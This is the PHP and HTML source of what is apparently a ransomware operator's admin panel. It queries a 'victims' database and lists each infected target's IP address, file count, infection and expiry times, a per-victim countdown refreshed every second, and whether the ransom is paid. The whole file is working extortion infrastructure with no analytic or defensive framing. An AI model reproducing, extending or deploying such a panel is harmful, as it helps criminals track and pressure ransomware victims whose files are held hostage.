<html>
  <head>
    <title>
      Admin Portal
    </title>
    <script src="/scripts/jquery.js">
    </script>
  </head>

  <body background="/images/hacker.jpg" style='background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: 100% 100%;'>
    <center>
    <table border='0'>
      <tr style="color: white;">
        <td align='center'>
          <b>ID</b>
        </td>
        <td align='center'>
          <b>Unique ID</b>
        </td>
        <td align='center'>
          <b>Target IP</b>
        </td>
        <td align='center'>
          <b>File Count</b>
        </td>
        <td align='center'>
          <b>Infection Time</b>
        </td>
        <td align='center'>
          <b>Expiration Time</b>
        </td>
        <td align='center'>
          <b>Time Expired</b>
        </td>
        <td align='center'>
          <b>Timer</b>
        </td>
        <td align='center'>
          <b>Paid</b>
        </td>
      </tr>
<?php

$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

$sql = "SELECT *, timediff(exp_time, \"$timestamp\") as time_left FROM target_list";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
   while ($row = $result->fetch_assoc()) {
         $evenOdd = $row['id'] % 2;
         if ($evenOdd == 0) {
            $color = "white";
         } else {
            $color = "gray";
         }

         echo "<tr bgcolor=\"$color\">";
         echo "<td align=\"center\">";
         echo "$row[id]";
         echo "</td>";
         echo "<td align=\"center\">";
         echo "$row[unique_id]";
         echo "</td>";
         echo "<td align=\"center\">";
         echo "$row[target_ip]";
         echo "</td>";
         echo "<td align=\"center\">";
         echo "$row[file_count]";
         echo "</td>";
         echo "<td align=\"center\">";
         echo "$row[curr_time]";
         echo "</td>";
         echo "<td align=\"center\">";
         echo "$row[exp_time]";
         echo "</td>";
         echo "<td align=\"center\">";
         if ($row['time_expired'] == 1) {
            echo "Expired";
         } else {
            echo "Not Expired";
         }
         echo "</td>";
         echo "<script>" . "\n";
         echo "   $(document).ready(function() {" . "\n";
         echo "     setInterval(function() {" . "\n";
         echo "       $.get(\"admin_query.php?unique_id=$row[unique_id]\", function (result) {" . "\n";
         echo "         $('#test$row[id]').html(result);" . "\n";
         echo "       });" . "\n";
         echo "     }, 1000);" . "\n";
         echo "  });" . "\n";
         echo "</script>" . "\n";
         echo "<td id=\"test$row[id]\" align=\"center\">";
         echo "</td>";
         echo "<td align=\"center\">";
         if ($row['paid'] == 0) {
           echo "<font color='red'>No</font>";
         } else {
           echo "<font color='green'>Yes</font>";
         }
         echo "</td>";
         echo "</tr>";
   }
}
?>
    </table>
    </center>
  </body>
</html>
